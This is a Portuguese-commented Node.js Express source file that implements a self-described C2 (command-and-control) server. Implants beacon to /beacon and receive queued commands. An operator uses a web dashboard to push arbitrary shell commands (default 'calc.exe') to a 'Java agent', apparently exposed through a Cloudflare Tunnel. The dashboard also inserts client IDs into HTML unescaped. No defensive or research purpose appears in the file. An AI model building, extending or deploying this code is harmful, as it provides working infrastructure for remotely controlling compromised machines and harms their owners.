const express = require('express');
const helmet = require('helmet'); // Importa o Helmet
const app = express();

// Middleware para processar JSON
app.use(express.json());

// --- NOVO: Configuração do Helmet e CSP ---
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      ...helmet.contentSecurityPolicy.getDefaultDirectives(),
      "script-src": ["'self'", "'unsafe-inline'"], // Permite scripts inline
      "style-src": ["'self'", "'unsafe-inline'"],  // Permite estilos inline
    },
  })
);

// Armazenamento em memória (código existente)
let clients = {};
let commandQueue = {};

// Limpeza de clientes inativos (código existente)
setInterval(() => {
    const now = Date.now();
    for (const clientId in clients) {
        if (now - clients[clientId].lastSeen > 180000) {
            delete clients[clientId];
            delete commandQueue[clientId];
        }
    }
}, 60000);

// Rota /beacon (código existente)
app.post('/beacon', (req, res) => {
    const { client_id } = req.body;
    if (client_id) {
        clients[client_id] = { id: client_id, lastSeen: Date.now() };
        const commandToSend = commandQueue[client_id] || null;
        delete commandQueue[client_id];
        res.json({ command: commandToSend });
    } else {
        res.status(400).send('Bad Request: client_id ausente.');
    }
});

// Rota /send-command (código existente)
app.post('/send-command', (req, res) => {
    const { client_id, command } = req.body;
    if (client_id && command && clients[client_id]) {
        commandQueue[client_id] = command;
        res.status(200).send('Comando enfileirado com sucesso.');
    } else {
        res.status(404).send('Cliente não encontrado ou comando inválido.');
    }
});

// Rota /dashboard (código existente)
app.get('/dashboard', (req, res) => {
    let clientListHtml = '';
    if (Object.keys(clients).length > 0) {
        for (const clientId in clients) {
            clientListHtml += `<tr><td>${clientId}</td><td>${new Date(clients[clientId].lastSeen).toLocaleString()}</td></tr>`;
        }
    } else {
        clientListHtml = '<tr><td colspan="2">Nenhum cliente ativo.</td></tr>';
    }
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Painel de Controle C2</title>
            <style>
                body { font-family: sans-serif; background-color: #222; color: #eee; } table { border-collapse: collapse; width: 100%; } th, td { border: 1px solid #444; padding: 8px; } th { background-color: #333; } #main { max-width: 800px; margin: auto; padding: 20px; } input { width: 95%; padding: 8px; margin-bottom: 10px; } button { padding: 10px 15px; }
            </style>
        </head>
        <body>
            <div id="main">
                <h1>Painel de Controle C2</h1>
                <h2>Clientes Ativos</h2>
                <table>
                    <thead><tr><th>ID do Cliente</th><th>Última Conexão</th></tr></thead>
                    <tbody id="client-table-body">${clientListHtml}</tbody>
                </table>
                <hr>
                <h2>Enviar Comando para Agente Java</h2>
                <form id="commandForm">
                    <label for="clientId">ID do Cliente:</label><input type="text" id="clientId" name="clientId" required><label for="command">Comando a ser executado:</label><input type="text" id="command" name="command" value="calc.exe" required><button type="submit">Enviar Comando</button>
                </form>
                <p id="formStatus"></p>
            </div>
            <script>
                setInterval(() => window.location.reload(), 30000);
                document.getElementById('commandForm').addEventListener('submit', function(e) {
                    e.preventDefault();
                    const clientId = document.getElementById('clientId').value;
                    const command = document.getElementById('command').value;
                    const statusP = document.getElementById('formStatus');
                    fetch('/send-command', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ client_id: clientId, command: command })
                    }).then(response => response.text()).then(text => {
                        statusP.textContent = 'Resposta do servidor: ' + text;
                        setTimeout(() => statusP.textContent = '', 5000);
                    }).catch(err => { statusP.textContent = 'Erro ao enviar comando.'; });
                });
            </script>
        </body>
        </html>
    `);
});

const PORT = 8080;
app.listen(PORT, () => {
    console.log(`Servidor C2 (Express) rodando na porta ${PORT}`);
    console.log(`Painel disponível em http://127.0.0.1:${PORT}/dashboard` );
    console.log('Aguardando conexões do Cloudflare Tunnel...');
});
